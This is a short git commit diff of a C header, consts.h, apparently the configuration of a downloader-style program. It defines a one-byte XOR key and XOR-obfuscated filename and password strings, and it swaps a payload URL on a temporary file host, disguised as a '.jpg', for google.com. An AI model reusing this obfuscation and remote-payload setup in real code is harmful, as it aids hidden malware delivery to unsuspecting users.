3f5770215822c147007ed7ffaa4dc62df4d6e533
blacchat <lolcow@protonmail.com>
2019-03-17 20:41:27 -0400

    upload

--- consts.h
+++ consts.h
@@ -1,5 +1,5 @@
 #define DEBUG 
 #define XOR_KEY "\x50"
-#define URL "https://a.uguu.se/CZPk8JYblZN3_hamad.jpg"
+#define URL "https://www.google.com"
 #define FILENAME "\x50\x4\x40\x5a\x4d"
 #define PASSWORD "\x48\x46\x1b\x44\x4d\x48\x46\x1b\x44\x4d\xb" 
